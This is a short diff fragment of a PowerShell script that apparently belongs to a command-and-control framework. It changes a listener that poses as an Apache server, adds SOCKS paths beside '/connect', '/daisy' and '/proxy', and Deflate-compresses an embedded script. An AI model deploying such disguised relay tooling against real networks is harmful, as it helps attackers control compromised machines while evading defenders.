@@ -842,7 +842,7 @@ if (`$cookie) {
 <address>Apache (Debian) Server</address>
 </body></html>
 '
-`$URLS = $($URLS),"/connect","/daisy","/proxy"
+`$URLS = $($URLS),$($SocksURLS),"/connect","/daisy","/proxy"
 `$listener = New-Object -TypeName System.Net.HttpListener 
 `$listener.Prefixes.Add("http://+:`$serverport/") 
 `$listener.Start()
@@ -907,7 +907,6 @@ while (`$listener.IsListening)
 "@
 
 $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
-
 $CompressedStream = New-Object IO.MemoryStream
 $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
 $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
